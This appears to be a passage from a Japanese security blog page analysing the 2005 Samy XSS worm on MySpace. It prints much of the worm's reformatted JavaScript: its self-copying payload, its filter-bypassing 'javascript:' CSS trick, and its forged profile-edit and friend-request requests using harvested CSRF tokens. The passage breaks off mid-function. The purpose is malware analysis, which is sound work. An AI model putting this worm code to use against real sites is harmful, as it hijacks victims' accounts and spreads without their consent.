
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-136221103-1"></script>
        <script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'UA-136221103-1');
        </script>

        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>XSSワーム「Samy」の動作を解析する · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">

        <meta name="twitter:card" content="summary" />
        <meta name="twitter:title" content="XSSワーム「Samy」の動作を解析する" />
        <meta name="twitter:image" content="https://akaki.io/gitbook/images/apple-touch-icon-precomposed-152.png" />

        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
        <link rel="stylesheet" href="../book.css">
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="crlfi_via_path_of_request-uri.html" />
    
    
    <link rel="prev" href="impact_of_cookie_bomb.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Akaki I/O
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">2019</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../2019/hackedu.html">
            
                <a href="../2019/hackedu.html">
            
                    
                    HackerOneに報告された脆弱性をHackEDUで再現する
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">2018</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="impact_of_cookie_bomb.html">
            
                <a href="impact_of_cookie_bomb.html">
            
                    
                    CRLFインジェクションによるCookie Bombの脅威
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="3.2" data-path="analyzing_samy_xss_worm.html">
            
                <a href="analyzing_samy_xss_worm.html">
            
                    
                    XSSワーム「Samy」の動作を解析する
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="crlfi_via_path_of_request-uri.html">
            
                <a href="crlfi_via_path_of_request-uri.html">
            
                    
                    Request-URIのパスからのCRLFインジェクション
            
                </a>
            

            
        </li>
    

    
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >XSSワーム「Samy」の動作を解析する</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="xss&#x30EF;&#x30FC;&#x30E0;&#x300C;samy&#x300D;&#x306E;&#x52D5;&#x4F5C;&#x3092;&#x89E3;&#x6790;&#x3059;&#x308B;">XSS&#x30EF;&#x30FC;&#x30E0;&#x300C;Samy&#x300D;&#x306E;&#x52D5;&#x4F5C;&#x3092;&#x89E3;&#x6790;&#x3059;&#x308B;</h1>
<p>&#x3053;&#x306E;&#x30A8;&#x30F3;&#x30C8;&#x30EA;&#x30FC;&#x306F;&#x30BB;&#x30AD;&#x30E5;&#x30EA;&#x30C6;&#x30A3;&#x30FB;&#x30AD;&#x30E3;&#x30F3;&#x30D7;WS&#x300C;The Anatomy of Malware &#x5B8C;&#x5168;&#x7248;&#x300D;&#x306E;&#x5FDC;&#x52DF;&#x8AB2;&#x984C;&#x3068;&#x3057;&#x3066;&#x63D0;&#x51FA;&#x3057;&#x305F;&#x3082;&#x306E;&#x3067;&#x3042;&#x308B;&#x3002;&#x516C;&#x958B;&#x306B;&#x3042;&#x305F;&#x308A;&#x4E00;&#x90E8;&#x6587;&#x7AE0;&#x306E;&#x4FEE;&#x6B63;&#x3068;&#x56F3;&#x5F0F;&#x306E;&#x5DEE;&#x3057;&#x66FF;&#x3048;&#x3092;&#x304A;&#x3053;&#x306A;&#x3063;&#x305F;&#x3002;</p>
<h2 id="samy&#x306E;&#x8A95;&#x751F;&#x3068;&#x305D;&#x308C;&#x306B;&#x3088;&#x308B;&#x88AB;&#x5BB3;">Samy&#x306E;&#x8A95;&#x751F;&#x3068;&#x305D;&#x308C;&#x306B;&#x3088;&#x308B;&#x88AB;&#x5BB3;</h2>
<p>&#x30A2;&#x30E1;&#x30EA;&#x30AB;&#x306E;&#x30CF;&#x30C3;&#x30AB;&#x30FC;&#x3067;&#x3042;&#x308B;Samy Kamkar&#x6C0F;&#xFF08;<a href="https://twitter.com/samykamkar" target="_blank">@samykamkar</a>&#xFF09;&#x304C;2005&#x5E74;&#x306B;&#x30EA;&#x30EA;&#x30FC;&#x30B9;&#x3057;&#x305F;MySpace&#x3092;&#x6A19;&#x7684;&#x3068;&#x3059;&#x308B;XSS&#x30EF;&#x30FC;&#x30E0;&#x304C;&#x300C;Samy&#xFF08;JS.Spacehero&#xFF09;&#x300D;&#x3067;&#x3042;&#x308B;&#x3002;&#x5F53;&#x6642;&#x306E;&#x30BD;&#x30FC;&#x30B7;&#x30E3;&#x30EB;&#x30FB;&#x30CD;&#x30C3;&#x30C8;&#x30EF;&#x30FC;&#x30AD;&#x30F3;&#x30B0;&#x30FB;&#x30B5;&#x30FC;&#x30D3;&#x30B9;MySpace&#x3067;&#x306F;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x3092;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x597D;&#x307F;&#x306E;&#x30B9;&#x30BF;&#x30A4;&#x30EB;&#x306B;&#x8A2D;&#x5B9A;&#x3067;&#x304D;&#x308B;&#x4ED5;&#x69D8;&#x3067;&#x3042;&#x308A;&#x3001;&#x4E00;&#x90E8;&#x306E;HTML&#x30BF;&#x30B0;&#x306E;&#x4F7F;&#x7528;&#x304C;&#x8A31;&#x53EF;&#x3055;&#x308C;&#x3066;&#x3044;&#x305F;&#x3002;JavaScript&#x306E;&#x5B9F;&#x884C;&#x306B;&#x3064;&#x306A;&#x304C;&#x308B;&#x30BF;&#x30B0;&#x3084;&#x5C5E;&#x6027;&#x306A;&#x3069;&#x306E;&#x4F7F;&#x7528;&#x306F;&#x7981;&#x6B62;&#x3055;&#x308C;&#x3066;&#x3044;&#x305F;&#x304C;&#x3001;Kamkar&#x6C0F;&#x306F;&#x305D;&#x306E;&#x30D5;&#x30A3;&#x30EB;&#x30BF;&#x30FC;&#x51E6;&#x7406;&#x3092;&#x56DE;&#x907F;&#x3067;&#x304D;&#x305F;<sup id="f1"><a href="#fn1">1</a></sup>&#x3002;&#x5F53;&#x6642;19&#x6B73;&#x3060;&#x3063;&#x305F;Kamkar&#x6C0F;&#x306F;&#x3053;&#x306E;&#x629C;&#x3051;&#x9053;&#x3092;&#x5229;&#x7528;&#x3057;&#x3066;&#x53CB;&#x9054;&#x3092;&#x5897;&#x3084;&#x3059;&#x305F;&#x3081;&#x306B;Samy&#x3092;&#x958B;&#x767A;&#x3057;&#x305F;&#x3002;</p>
<p>2005&#x5E74;10&#x6708;4&#x65E5;&#x306B;Kamkar&#x6C0F;&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x3067;&#x516C;&#x958B;&#x3055;&#x308C;&#x305F;Samy&#x306F;&#x3001;&#x308F;&#x305A;&#x304B;20&#x6642;&#x9593;&#x3067;100&#x4E07;&#x4EBA;&#x4EE5;&#x4E0A;&#x306E;MySpace&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x306B;&#x611F;&#x67D3;&#x3057;&#x305F;&#x3002;&#x3053;&#x306E;&#x30EF;&#x30FC;&#x30E0;&#x306F;&#x6700;&#x3082;&#x6025;&#x901F;&#x306B;&#x611F;&#x67D3;&#x3092;&#x5E83;&#x3052;&#x305F;&#x30DE;&#x30EB;&#x30A6;&#x30A7;&#x30A2;&#x3068;&#x8003;&#x3048;&#x3089;&#x308C;&#x3066;&#x304A;&#x308A;&#x3001;XSS&#x30EF;&#x30FC;&#x30E0;&#x306E;&#x8D77;&#x6E90;&#x306B;&#x3057;&#x3066;&#x9802;&#x70B9;&#x3068;&#x8A00;&#x3048;&#x308B;&#x3060;&#x308D;&#x3046;&#x3002;&#x611F;&#x67D3;&#x3057;&#x305F;&#x30E6;&#x30FC;&#x30B6;&#x30FC;&#x306F;Kamkar&#x6C0F;&#x306E;&#x30A2;&#x30AB;&#x30A6;&#x30F3;&#x30C8;&#x3078;&#x306E;&#x30D5;&#x30EC;&#x30F3;&#x30C9;&#x7533;&#x8ACB;&#x3092;&#x5F37;&#x5236;&#x3055;&#x308C;&#x3001;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x306E;&#x30D2;&#x30FC;&#x30ED;&#x30FC;&#x6B04;&#x306B; <code>but most of all, samy is my hero.</code> &#x3068;&#x306E;&#x6587;&#x8A00;&#x3068;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#xFF08;Samy&#x81EA;&#x8EAB;&#xFF09;&#x3092;&#x66F8;&#x304D;&#x8FBC;&#x307E;&#x308C;&#x308B;&#x3002;&#x60C5;&#x5831;&#x8CC7;&#x7523;&#x306E;&#x7A83;&#x53D6;&#x3084;&#x91D1;&#x92AD;&#x306E;&#x8981;&#x6C42;&#x306A;&#x3069;&#x306E;&#x60AA;&#x8CEA;&#x306A;&#x884C;&#x70BA;&#x306F;&#x304A;&#x3053;&#x306A;&#x308F;&#x308C;&#x306A;&#x304B;&#x3063;&#x305F;&#x3002;</p>
<h2 id="samy&#x306E;&#x611F;&#x67D3;&#x52D5;&#x4F5C;">Samy&#x306E;&#x611F;&#x67D3;&#x52D5;&#x4F5C;</h2>
<p>&#x4ECA;&#x56DE;&#x306F;<a href="https://samy.pl/popular/tech.html" target="_blank">Kamkar&#x6C0F;&#x306E;&#x30B5;&#x30A4;&#x30C8;</a>&#x306B;&#x6B8B;&#x3055;&#x308C;&#x3066;&#x3044;&#x308B;<a href="https://gist.github.com/atsunoda/efe6970e522b6af9c0cdecea0fa251bf#file-samy" target="_blank">Samy&#x306E;&#x30B3;&#x30FC;&#x30C9;</a>&#x3092;&#x6574;&#x5F62;&#x3057;&#x3001;<a href="https://gist.github.com/atsunoda/efe6970e522b6af9c0cdecea0fa251bf#file-samy-js" target="_blank">&#x5909;&#x6570;&#x540D;&#x3092;&#x4ED8;&#x4E0E;&#x3057;&#x305F;&#x30B3;&#x30FC;&#x30C9;</a>&#x3092;&#x5F15;&#x7528;&#x3057;&#x306A;&#x304C;&#x3089;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x3092;&#x89E3;&#x6790;&#x3059;&#x308B;&#x3002;&#x30B3;&#x30FC;&#x30C9;&#x30D5;&#x30ED;&#x30FC;&#x3092;&#x56F3;&#x306B;&#x793A;&#x3059;&#x3068;&#x4EE5;&#x4E0B;&#x306E;&#x3088;&#x3046;&#x306B;&#x306A;&#x308B;&#x3002;</p>
<p align="center"><img src="https://user-images.githubusercontent.com/5434303/36792459-fd3f868a-1cdd-11e8-91f5-aa9e0aea9e70.png" alt="Samy&apos;s activity"></p>

<p>MySpace&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x306F; <code>profile.myspace.com</code> &#x3068; <code>www.myspace.com</code> &#x306E;&#x4E21;&#x65B9;&#x306E;&#x30C9;&#x30E1;&#x30A4;&#x30F3;&#x304B;&#x3089;&#x95B2;&#x89A7;&#x3067;&#x304D;&#x305F;&#x3002;&#x3057;&#x304B;&#x3057;&#x7DE8;&#x96C6;&#x306F;&#x5F8C;&#x8005;&#x304B;&#x3089;&#x3057;&#x304B;&#x304A;&#x3053;&#x306A;&#x3048;&#x306A;&#x304B;&#x3063;&#x305F;&#x305F;&#x3081;&#x3001;&#x6700;&#x521D;&#x306B;&#x30B5;&#x30D6;&#x30C9;&#x30E1;&#x30A4;&#x30F3;&#x3092;&#x78BA;&#x8A8D;&#x3057;&#x3066;&#x3044;&#x308B;&#x3002;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x306B;&#x5229;&#x7528;&#x3059;&#x308B;&#x30DA;&#x30FC;&#x30B8;&#x3068;&#x305D;&#x306E;URL&#x306F;&#x4EE5;&#x4E0B;&#x3067;&#x3042;&#x308B;&#x3002;</p>
<ul>
<li>&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x30DA;&#x30FC;&#x30B8;<br>hxxp://www[.]myspace.com/index.cfm?fuseaction=user.viewProfile</li>
<li>&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x78BA;&#x8A8D;&#x30DA;&#x30FC;&#x30B8;<br>hxxp://www[.]myspace.com/index.cfm?fuseaction=profile.previewInterests</li>
<li>&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x5B8C;&#x4E86;&#x30DA;&#x30FC;&#x30B8;<br>hxxp://www[.]myspace.com/index.cfm?fuseaction=profile.processInterests</li>
</ul>
<p>&#x30B3;&#x30FC;&#x30C9;&#x30D5;&#x30ED;&#x30FC;&#x3068;&#x5404;&#x30DA;&#x30FC;&#x30B8;&#x306E;URL&#x3092;&#x628A;&#x63E1;&#x3057;&#x305F;&#x4E0A;&#x3067; <code>main()</code> &#x304B;&#x3089;&#x8AAD;&#x307F;&#x89E3;&#x3044;&#x3066;&#x3044;&#x304F;&#x3002;</p>
<h3 id="main&#x306E;&#x52D5;&#x4F5C;">main()&#x306E;&#x52D5;&#x4F5C;</h3>
<p>&#x3053;&#x306E;&#x30B3;&#x30FC;&#x30C9;&#x304C;&#x5B58;&#x5728;&#x3059;&#x308B;&#xFF08;&#x611F;&#x67D3;&#x6E08;&#x307F;&#x306E;&#xFF09;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x30DA;&#x30FC;&#x30B8;&#x3092;&#x95B2;&#x89A7;&#x3057;&#x305F;&#x88AB;&#x5BB3;&#x8005;&#x306E;ID&#x3092; <code>getClientFID()</code> &#x3067;&#x53D6;&#x5F97;&#x3059;&#x308B;&#x3002;&#x305D;&#x306E;&#x5F8C; <code>httpSend()</code> &#x3067;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x306E;&#x66F8;&#x304D;&#x8FBC;&#x307F;&#x3092;&#x3001; <code>httpSend2()</code> &#x3067;&#x30D5;&#x30EC;&#x30F3;&#x30C9;&#x7533;&#x8ACB;&#x3092;&#x304A;&#x3053;&#x306A;&#x3046;&#x3002;&#x4ECA;&#x56DE;&#x306F;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x306B;&#x6CE8;&#x76EE;&#x3059;&#x308B;&#x305F;&#x3081; <code>httpSend()</code> &#x306E;&#x51E6;&#x7406;&#x3092;&#x8FFD;&#x3046;&#x3002;</p>
<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">var</span> AN_clientFID = getClientFID();
  <span class="hljs-keyword">var</span> BH_uri = <span class="hljs-string">&apos;/index.cfm?fuseaction=user.viewProfile&amp;friendID=&apos;</span> + AN_clientFID + <span class="hljs-string">&apos;&amp;Mytoken=&apos;</span> + L_myToken;
  J_xmlhttp1 = getXMLObj();
  httpSend(BH_uri, getHome, <span class="hljs-string">&apos;GET&apos;</span>);
  xmlhttp2 = getXMLObj();
  httpSend2(<span class="hljs-string">&apos;/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken=&apos;</span> + L_myToken, processxForm, <span class="hljs-string">&apos;GET&apos;</span>)
}
</code></pre>
<h3 id="httpsend&#x306E;&#x52D5;&#x4F5C;">httpSend()&#x306E;&#x52D5;&#x4F5C;</h3>
<p>&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x306B;&#x5229;&#x7528;&#x3059;&#x308B;&#x30DA;&#x30FC;&#x30B8;&#x3078;&#x306E;&#x901A;&#x4FE1;&#x306F;&#x5168;&#x3066;&#x3053;&#x306E;&#x95A2;&#x6570;&#x304B;&#x3089;&#x304A;&#x3053;&#x306A;&#x308F;&#x308C;&#x308B;&#x3002;<code>onreadystatechange</code> &#x30A4;&#x30D9;&#x30F3;&#x30C8;&#x304B;&#x3089;&#x5B9F;&#x884C;&#x3055;&#x308C;&#x308B; <code>getHome()</code> &#x3067;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x78BA;&#x8A8D;&#x30DA;&#x30FC;&#x30B8;&#x3068;&#x306E;&#x901A;&#x4FE1;&#x3092;&#x3001;<code>postHero()</code> &#x3067;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x5B8C;&#x4E86;&#x30DA;&#x30FC;&#x30B8;&#x3068;&#x306E;&#x901A;&#x4FE1;&#x3092;&#x304A;&#x3053;&#x306A;&#x3046;&#x3002;</p>
<p>&#x307E;&#x305A;&#x88AB;&#x5BB3;&#x8005;&#x306E;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x30DA;&#x30FC;&#x30B8;&#x3092;GET&#x3059;&#x308B;&#x3002;&#x901A;&#x4FE1;&#x72B6;&#x614B;&#xFF08;readyState&#xFF09;&#x304C;&#x5909;&#x308F;&#x308B;&#x305F;&#x3073;&#x306B;&#x30A4;&#x30D9;&#x30F3;&#x30C8;&#x304C;&#x767A;&#x751F;&#x3057;&#x3001;&#x901A;&#x4FE1;&#x304C;&#x7D42;&#x4E86;&#x3059;&#x308B;&#x3068; <code>getHome()</code> &#x306E;&#x51E6;&#x7406;&#x306B;&#x9032;&#x3080;&#x3002;</p>
<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">httpSend</span>(<span class="hljs-params">BH_uri, BI_function, BJ_method, BK_contents</span>) </span>{
  <span class="hljs-keyword">if</span> (!J_xmlhttp1) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  }
  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&apos;J_xmlhttp1.onr&apos;</span> + <span class="hljs-string">&apos;eadystatechange=BI_function&apos;</span>);
  J_xmlhttp1.open(BJ_method, BH_uri, <span class="hljs-literal">true</span>);
  <span class="hljs-keyword">if</span> (BJ_method == <span class="hljs-string">&apos;POST&apos;</span>) {
    J_xmlhttp1.setRequestHeader(<span class="hljs-string">&apos;Content-Type&apos;</span>, <span class="hljs-string">&apos;application/x-www-form-urlencoded&apos;</span>);
    J_xmlhttp1.setRequestHeader(<span class="hljs-string">&apos;Content-Length&apos;</span>, BK_contents.length)
  }
  J_xmlhttp1.send(BK_contents);
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
}
</code></pre>
<h3 id="gethome&#x306E;&#x52D5;&#x4F5C;">getHome()&#x306E;&#x52D5;&#x4F5C;</h3>
<p>GET&#x3057;&#x305F;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x30DA;&#x30FC;&#x30B8;&#x306E;&#x30EC;&#x30B9;&#x30DD;&#x30F3;&#x30B9;&#x3092;&#x89E3;&#x6790;&#x3057;&#x3001;&#x30D2;&#x30FC;&#x30ED;&#x30FC;&#x6B04;&#x306B; <code>samy</code> &#x306E;&#x6587;&#x5B57;&#x304C;&#x542B;&#x307E;&#x308C;&#x3066;&#x3044;&#x308B;&#x304B;&#x78BA;&#x8A8D;&#x3059;&#x308B;&#x3002;&#x542B;&#x307E;&#x308C;&#x3066;&#x3044;&#x308B;&#x5834;&#x5408;&#x306F;&#x65E2;&#x306B;&#x611F;&#x67D3;&#x6E08;&#x307F;&#x3068;&#x5224;&#x65AD;&#x3057;&#x3001;&#x611F;&#x67D3;&#x52D5;&#x4F5C;&#x306F;&#x7D42;&#x4E86;&#x3059;&#x308B;&#x3002;&#x542B;&#x307E;&#x308C;&#x3066;&#x3044;&#x306A;&#x3044;&#x5834;&#x5408;&#x306F;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x3092;&#x642D;&#x8F09;&#x3057;&#x305F;&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;&#x7D44;&#x307F;&#x7ACB;&#x3066;&#x3001;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x78BA;&#x8A8D;&#x30DA;&#x30FC;&#x30B8;&#x306B;POST&#x3059;&#x308B;&#x3002;&#x305D;&#x306E;&#x901A;&#x4FE1;&#x304C;&#x7D42;&#x4E86;&#x3059;&#x308B;&#x3068; <code>postHero()</code> &#x306E;&#x51E6;&#x7406;&#x306B;&#x9032;&#x3080;&#x3002;</p>
<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getHome</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">if</span> (J_xmlhttp1.readyState != <span class="hljs-number">4</span>) {
    <span class="hljs-keyword">return</span>
  }
  <span class="hljs-keyword">var</span> AU_responseHTML = J_xmlhttp1.responseText;
  AG_heroes = findIn(AU_responseHTML, <span class="hljs-string">&apos;P&apos;</span> + <span class="hljs-string">&apos;rofileHeroes&apos;</span>, <span class="hljs-string">&apos;&lt;/td&gt;&apos;</span>);
  AG_heroes = AG_heroes.substring(<span class="hljs-number">61</span>, AG_heroes.length);
  <span class="hljs-keyword">if</span> (AG_heroes.indexOf(<span class="hljs-string">&apos;samy&apos;</span>) == <span class="hljs-number">-1</span>) {
    <span class="hljs-keyword">if</span> (AF_payload) {
      AG_heroes += AF_payload;
      <span class="hljs-keyword">var</span> AR_myToken = getFromURL(AU_responseHTML, <span class="hljs-string">&apos;Mytoken&apos;</span>);
      <span class="hljs-keyword">var</span> AS_params = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
      AS_params[<span class="hljs-string">&apos;interestLabel&apos;</span>] = <span class="hljs-string">&apos;heroes&apos;</span>;
      AS_params[<span class="hljs-string">&apos;submit&apos;</span>] = <span class="hljs-string">&apos;Preview&apos;</span>;
      AS_params[<span class="hljs-string">&apos;interest&apos;</span>] = AG_heroes;
      J_xmlhttp1 = getXMLObj();
      httpSend(<span class="hljs-string">&apos;/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken=&apos;</span> + AR_myToken, postHero, <span class="hljs-string">&apos;POST&apos;</span>, paramsToString(AS_params))
    }
  }
}
</code></pre>
<h3 id="afpayload&#x306E;&#x751F;&#x6210;">AF_payload&#x306E;&#x751F;&#x6210;</h3>
<p>&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x3092;&#x751F;&#x6210;&#x3059;&#x308B;&#x51E6;&#x7406;&#x306F;&#x4EE5;&#x4E0B;&#x3067;&#x3042;&#x308B;&#x3002;&#x3053;&#x306E;&#x30B3;&#x30FC;&#x30C9;&#x304C;&#x5B58;&#x5728;&#x3059;&#x308B;&#x30DA;&#x30FC;&#x30B8;&#x306E;HTML&#x3092;&#x53D6;&#x5F97;&#x3057;&#x3001;&#x305D;&#x3053;&#x304B;&#x3089;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x306B;&#x518D;&#x5229;&#x7528;&#x3059;&#x308B;&#x6587;&#x5B57;&#x5217;&#x3092;&#x62BD;&#x51FA;&#x3059;&#x308B;&#x3002;&#x3053;&#x306E;&#x51E6;&#x7406;&#x3067;Samy&#x81EA;&#x8EAB;&#x3092;&#x8907;&#x88FD;&#x3057;&#x3066;&#x3044;&#x308B;&#x3002;</p>
<pre><code class="lang-js"><span class="hljs-keyword">var</span> AA_selfHTML = g_getSelfHTML();
<span class="hljs-keyword">var</span> AB_indexHeadOfSelfPayload = AA_selfHTML.indexOf(<span class="hljs-string">&apos;m&apos;</span> + <span class="hljs-string">&apos;ycode&apos;</span>);
<span class="hljs-keyword">var</span> AC_string = AA_selfHTML.substring(AB_indexHeadOfSelfPayload, AB_indexHeadOfSelfPayload + <span class="hljs-number">4096</span>);  <span class="hljs-comment">// Length of unformatted self code is 4015.</span>
<span class="hljs-keyword">var</span> AD_indexTailOfSelfPayload = AC_string.indexOf(<span class="hljs-string">&apos;D&apos;</span> + <span class="hljs-string">&apos;IV&apos;</span>);
<span class="hljs-keyword">var</span> AE_selfPayload = AC_string.substring(<span class="hljs-number">0</span>, AD_indexTailOfSelfPayload);
<span class="hljs-keyword">var</span> AF_payload;
<span class="hljs-keyword">if</span> (AE_selfPayload) {
  AE_selfPayload = AE_selfPayload.replace(<span class="hljs-string">&apos;jav&apos;</span> + <span class="hljs-string">&apos;a&apos;</span>, A_singleQuote + <span class="hljs-string">&apos;jav&apos;</span> + <span class="hljs-string">&apos;a&apos;</span>);
  AE_selfPayload = AE_selfPayload.replace(<span class="hljs-string">&apos;exp&apos;</span> + <span class="hljs-string">&apos;r)&apos;</span>, <span class="hljs-string">&apos;exp&apos;</span> + <span class="hljs-string">&apos;r)&apos;</span> + A_singleQuote);
  AF_payload = <span class="hljs-string">&apos; but most of all, samy is my hero. &lt;d&apos;</span> + <span class="hljs-string">&apos;iv id=&apos;</span> + AE_selfPayload + <span class="hljs-string">&apos;D&apos;</span> + <span class="hljs-string">&apos;IV&gt;&apos;</span>
}
<span class="hljs-keyword">var</span> AG_heroes;
</code></pre>
<p>&#x62BD;&#x51FA;&#x3057;&#x305F;&#x6587;&#x5B57;&#x5217;&#x306E;&#x4E8C;&#x7B87;&#x6240;&#x306B; <code>&apos;</code> &#x3092;&#x8FFD;&#x52A0;&#x3059;&#x308B;&#x51E6;&#x7406;&#x304C;&#x3042;&#x308B;&#x3002;IE6&#x306E;DOM&#x304B;&#x3089; <code>createTextRange()</code> &#x3084; <code>innerHTML</code> &#x306B;&#x3088;&#x3063;&#x3066;&#x751F;&#x6210;&#x3055;&#x308C;&#x305F;HTML&#x3067;&#x306F;&#x3001;Style&#x5C5E;&#x6027;&#x5024;&#x5185;&#x306E;&#x5F15;&#x7528;&#x7B26;&#x304C;&#x524A;&#x9664;&#x3055;&#x308C;&#x308B;&#x3053;&#x3068;&#x304B;&#x3089;&#x3001;&#x3082;&#x3068;&#x306E;&#x72B6;&#x614B;&#x306B;&#x623B;&#x3059;&#x305F;&#x3081;&#x306E;&#x51E6;&#x7406;&#x3060;&#x3068;&#x8003;&#x3048;&#x308B;<sup id="f2"><a href="#fn2">2</a></sup>&#x3002;&#x3053;&#x308C;&#x306B;&#x3088;&#x308A;CSS&#x69CB;&#x6587;&#x306F;&#x4EE5;&#x4E0B;&#x306E;&#x3088;&#x3046;&#x306B;&#x4FEE;&#x6B63;&#x3055;&#x308C;&#x308B;&#x3002;</p>
<pre><code class="lang-diff"><span class="hljs-deletion">-BACKGROUND: url(java </span>
<span class="hljs-deletion">-script:eval(document.all.mycode.expr))</span>
<span class="hljs-addition">+BACKGROUND: url(&apos;java </span>
<span class="hljs-addition">+script:eval(document.all.mycode.expr)&apos;)</span>
</code></pre>
<h3 id="posthero&#x306E;&#x52D5;&#x4F5C;">postHero()&#x306E;&#x52D5;&#x4F5C;</h3>
<p>&#x6700;&#x5F8C;&#x306B;&#x30DA;&#x30A4;&#x30ED;&#x30FC;&#x30C9;&#x3092;&#x642D;&#x8F09;&#x3057;&#x305F;&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x3092;&#x30D7;&#x30ED;&#x30D5;&#x30A3;&#x30FC;&#x30EB;&#x7DE8;&#x96C6;&#x5B8C;&#x4E86;&#x30DA;&#x30FC;&#x30B8;&#x306B;POST&#x3059;&#x308B;&#x3002;&#x30EA;&#x30AF;&#x30A8;&#x30B9;&#x30C8;&#x306B;&#x306F;&#x78BA;&#x8A8D;&#x30DA;&#x30FC;&#x30B8;&#x304B;&#x3089;&#x62BD;&#x51FA;&#x3057;&#x305F;CSRF&#x5BFE;&#x7B56;&#x30C8;&#x30FC;&#x30AF;&#x30F3; <code>hash</code> &#x3082;&#x542B;&#x3081;&#x3066;&#x3044;&#x308B;&#x3002;</p>
<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">postHero</span>(<span class="hljs-params"></span>) </span>{
  <span class="hljs-keyword">if</span> (J_xmlhttp1.readyState != <span class="hljs-number">4</span>) {
    <span class="hljs-keyword">return</span>
  }
  <span class="hljs-keyword">var</span> AU_responseHTML = J_xmlhttp1.responseText;
  <span class="hljs-keyword">var</span> AR_myToken = getFromURL(AU_responseHTML, <span class="hljs-string">&apos;Mytoken&apos;</span>);
  <span class="hljs-keyword">var</span> AS_params = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();
